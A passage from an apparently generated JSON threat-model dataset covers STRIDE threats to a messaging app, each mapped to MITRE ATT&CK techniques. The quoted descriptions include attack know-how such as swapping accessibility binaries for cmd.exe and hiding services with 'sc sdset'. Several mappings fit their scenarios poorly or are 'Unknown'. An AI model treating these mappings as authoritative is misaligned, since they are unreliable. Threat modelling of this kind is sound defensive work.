                "SQL Injection",
                "Data Tampering",
                "SQLite"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the messaging app to alter communication protocols, weakening encryption.",
            "Assumptions": [
                {
                    "Assumption": "There are exploitable vulnerabilities in the encryption protocols.",
                    "Role": "Attackers",
                    "Condition": "Valid if vulnerabilities are not patched in a timely manner."
                },
                {
                    "Assumption": "Users continue to use the application despite the altered protocol.",
                    "Role": "End users",
                    "Condition": "Valid if users are unaware of the tampering."
                },
                {
                    "Assumption": "The application does not enforce strict version controls.",
                    "Role": "Application developers",
                    "Condition": "Valid if protocol updates are not securely distributed."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Protocol Exploitation",
                "Encryption Weakening",
                "Vulnerability Exploitation",
                "Tampering"
            ],
            "mitre_technique": {
                "name": "Disable Crypto Hardware",
                "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5",
                "technique_id": "T1600.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with access to a user's device replaces the application files with compromised versions.",
            "Assumptions": [
                {
                    "Assumption": "The device is not adequately secured against unauthorized access.",
                    "Role": "End users",
                    "Condition": "Valid if the attacker can physically or remotely access the device."
                },
                {
                    "Assumption": "Application files are not signed or verified before execution.",
                    "Role": "Application developers",
                    "Condition": "Valid if the application lacks integrity checks."
                },
                {
                    "Assumption": "Users do not notice or report discrepancies in application behavior.",
                    "Role": "End users",
                    "Condition": "Valid if the compromised versions function similarly to the originals."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "Binary Replacement",
                "File Tampering",
                "Device Compromise",
                "Malware Injection"
            ],
            "mitre_technique": {
                "name": "Accessibility Features",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
                "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
                "technique_id": "T1546.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies sending malicious or inappropriate messages, claiming their account was compromised.",
            "Assumptions": [
                {
                    "Assumption": "Message logs and records can be altered or deleted.",
                    "Role": "End users",
                    "Condition": "Valid if logs are not immutable or cryptographically signed."
                },
                {
                    "Assumption": "The application does not have a mechanism to verify the authenticity of sent messages.",
                    "Role": "Application developers",
                    "Condition": "Valid if message authenticity and origin are not verifiable."
                },
                {
                    "Assumption": "Other users cannot trust the integrity of messages.",
                    "Role": "End users",
                    "Condition": "Valid if there are no mechanisms for users to independently verify messages."
                }
            ],
            "Potential Impact": "Tampering of data and unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Message Forgery",
                "Non-Repudiation Attacks",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes chat histories or alters message timestamps to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to chat logs and message databases.",
                    "Role": "Attackers",
                    "Condition": "Valid if the attacker has compromised user devices or databases."
                },
                {
                    "Assumption": "Message integrity is not verified against a trusted source.",
                    "Role": "Application developers",
                    "Condition": "Valid if timestamps and messages are stored without additional integrity checks."
                },
                {
                    "Assumption": "Users rely solely on the application to store message histories.",
                    "Role": "End users",
                    "Condition": "Valid if users do not keep separate, secure backups."
                }
            ],
            "Potential Impact": "Corruption or tampering of data and disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Timestamp Manipulation",
                "Data Integrity",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker intercepts and alters audit logs to hide their malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are accessible and modifiable by unauthorized actors.",
                    "Role": "Attackers",
                    "Condition": "Valid if logs are not securely stored or protected."
                },
                {
                    "Assumption": "The application does not implement robust logging mechanisms.",
                    "Role": "Application developers",
                    "Condition": "Valid if audit logs are not cryptographically signed."
                },
                {
                    "Assumption": "Security mechanisms do not detect log alterations.",
                    "Role": "Security administrators",
                    "Condition": "Valid if monitoring systems are not in place or insufficient."
                }
            ],
            "Potential Impact": "Tampering of data and unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Audit Log Manipulation",
                "Intercepting Communications",
                "Repudiation",
                "Log Tampering"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious actor intercepts messages during transmission using advanced network eavesdropping techniques.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic can be intercepted by unauthorized users.",
                    "Role": "Attackers",
                    "Condition": "Valid if network traffic is not properly encrypted."
                },
                {
                    "Assumption": "End-to-end encryption protocols are not fully secure against interception.",
                    "Role": "Application developers",
                    "Condition": "Valid if there are weaknesses in the encryption implementation."
                },
                {
                    "Assumption": "Users do not use additional layers of encryption when sending sensitive data.",
                    "Role": "End users",
                    "Condition": "Valid if users rely solely on the application's built-in encryption."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Eavesdropping",
                "Network Interception",
                "Message Sniffing",
                "Encryption Weakness"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the SQLite databases used by the messaging applications, exposing stored messages and authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "SQLite databases are inadequately encrypted or protected.",
                    "Role": "Application developers",
                    "Condition": "Valid if databases are exposed to unauthorized access."
                },
                {
                    "Assumption": "Attackers can bypass device security measures.",
                    "Role": "Attackers",
                    "Condition": "Valid if the devices are compromised."
                },
                {
                    "Assumption": "Users do not implement additional security measures for sensitive data.",
                    "Role": "End users",
                    "Condition": "Valid if users rely solely on application-provided security."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Database Access",
                "Sensitive Data Exposure",
                "Authentication Bypass",
                "SQLite"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious actor leverages a zero-day vulnerability in the application to read encrypted messages in plaintext.",
            "Assumptions": [
                {
                    "Assumption": "There are undisclosed vulnerabilities in the application.",
                    "Role": "Application developers",
                    "Condition": "Valid if vulnerabilities have not been discovered or patched."
                },
                {
                    "Assumption": "Attackers can exploit the vulnerability before it is patched.",
                    "Role": "Attackers",
                    "Condition": "Valid if there is a window of time between discovery and mitigation."
                },
                {
                    "Assumption": "Users do not apply updates in a timely manner.",
                    "Role": "End users",
                    "Condition": "Valid if updates are available but not installed."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Zero-Day Exploitation",
                "Vulnerability Scanning",
                "Encrypted Data Access",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Vulnerability Scanning",
                "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                "id": "attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4",
                "technique_id": "T1595.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service (DDoS) attack against the messaging service, making it unavailable to users.",
            "Assumptions": [
                {
                    "Assumption": "The service is accessible via the internet.",
                    "Role": "Attackers",
                    "Condition": "Valid if the service is publicly accessible."
                },
                {
                    "Assumption": "The service infrastructure cannot handle high volumes of traffic.",
                    "Role": "Application developers",
                    "Condition": "Valid if the infrastructure is not scalable."
                },
                {
                    "Assumption": "Users have no alternative communication channels.",
                    "Role": "End users",
                    "Condition": "Valid if users rely solely on the affected service."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Service Disruption",
                "Network Traffic Flooding",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the messaging application to crash the service repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "There is an exploitable vulnerability in the application.",
                    "Role": "Application developers",
                    "Condition": "Valid if the vulnerability is not patched."
                },
                {
                    "Assumption": "Attackers can trigger the vulnerability repeatedly.",
                    "Role": "Attackers",
                    "Condition": "Valid if the application lacks safeguards against repeated exploitation."
                },
                {
                    "Assumption": "Users depend on the availability of the messaging service.",
                    "Role": "End users",
                    "Condition": "Valid if downtime causes significant disruption."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "Service Crash",
                "Vulnerability Exploitation",
                "Application Downtime",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a botnet to overwhelm the application's authentication mechanism, preventing legitimate users from logging in.",
            "Assumptions": [
                {
                    "Assumption": "The authentication mechanism is vulnerable to brute force attacks.",
                    "Role": "Attackers",
                    "Condition": "Valid if the mechanism cannot mitigate high volumes of requests."
                },
                {
                    "Assumption": "The attacker has access to a large botnet.",
                    "Role": "Attackers",
                    "Condition": "Valid if the attacker can coordinate multiple compromised devices."
                },
                {
                    "Assumption": "Users are unable to use alternative authentication methods.",
                    "Role": "End users",
                    "Condition": "Valid if the application does not support multiple authentication methods."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "Botnet",
                "Authentication Blocking",
                "Brute Force Attack",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a flaw in the desktop client software to gain administrative privileges and control over the application.",
            "Assumptions": [
                {
                    "Assumption": "There is an exploitable flaw in the desktop client software.",
                    "Role": "Application developers",
                    "Condition": "Valid if the flaw has not been patched."
                },
                {
                    "Assumption": "The attacker can successfully exploit the flaw.",
                    "Role": "Attackers",
                    "Condition": "Valid if the attacker has the necessary skills and tools."
                },
                {
                    "Assumption": "Users do not apply updates promptly.",
                    "Role": "End users",
                    "Condition": "Valid if updates are available but not installed."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Exploitation of Vulnerability",
                "Admin Access",
                "Desktop Client"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker injects malicious code into the messaging application's update process to execute arbitrary commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The update process can be intercepted and modified.",
                    "Role": "Attackers",
                    "Condition": "Valid if the update process is not securely handled."
                },
                {
                    "Assumption": "Users do not verify the authenticity of updates.",
                    "Role": "End users",
                    "Condition": "Valid if users do not check update sources."
                },
                {
                    "Assumption": "The application runs updates with elevated privileges.",
                    "Role": "Application developers",
                    "Condition": "Valid if updates are not executed in a secure environment."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "Code Injection",
                "Update Process",
                "Arbitrary Command Execution",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Component Object Model",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
                "technique_id": "T1559.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the authentication mechanism to obtain higher-level access than intended.",
            "Assumptions": [
                {
                    "Assumption": "The authentication mechanism contains exploitable vulnerabilities.",
                    "Role": "Application developers",
                    "Condition": "Valid if vulnerabilities are not discovered or patched."
                },
                {
                    "Assumption": "Attackers can bypass existing security controls.",
                    "Role": "Attackers",
                    "Condition": "Valid if security controls are insufficient."
                },
                {
                    "Assumption": "Users have roles and privileges that can be escalated.",
                    "Role": "End users",
                    "Condition": "Valid if the system allows for role-based access control."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Authentication Bypass",
                "Role-Based Access",
                "Privilege Escalation",
                "Elevated Access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the primary device by spoofing its identity key, gaining unauthorized access to the user's messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the user's primary device to extract the identity key.",
                    "Role": "Attacker",
                    "Condition": "The device is compromised physically or via malware."
                },
                {
                    "Assumption": "The system does not validate the integrity of the identity key before usage.",
                    "Role": "System Designer",
                    "Condition": "The encryption protocols lack robust key validation mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive message content.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "reconnaissance",
                "credential access",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A phishing campaign delivers fake desktop clients to users, which appear legitimate and request users to link their primary device.",
            "Assumptions": [
                {
                    "Assumption": "Users do not verify the authenticity of the desktop client before installation.",
                    "Role": "User",
                    "Condition": "The phishing campaign is convincingly executed."
                },
                {
                    "Assumption": "The malicious desktop client can mimic the legitimate request to link with the primary device.",
                    "Role": "Attacker",
                    "Condition": "The attacker's software engineering skills are sufficient to craft believable fake clients."
                }
            ],
            "Potential Impact": "Compromise of the user's primary device and data.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "social engineering",
                "spear phishing link",
                "malicious download"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a doppelganger website resembling the messaging application to harvest user credentials.",
            "Assumptions": [
                {
                    "Assumption": "The website is not blocked or flagged by security software.",
                    "Role": "Security Software",
                    "Condition": "The doppelganger website is new or not widely reported."
                },
                {
                    "Assumption": "Users fail to recognize the URL difference or SSL/TLS certificate discrepancies.",
                    "Role": "User",
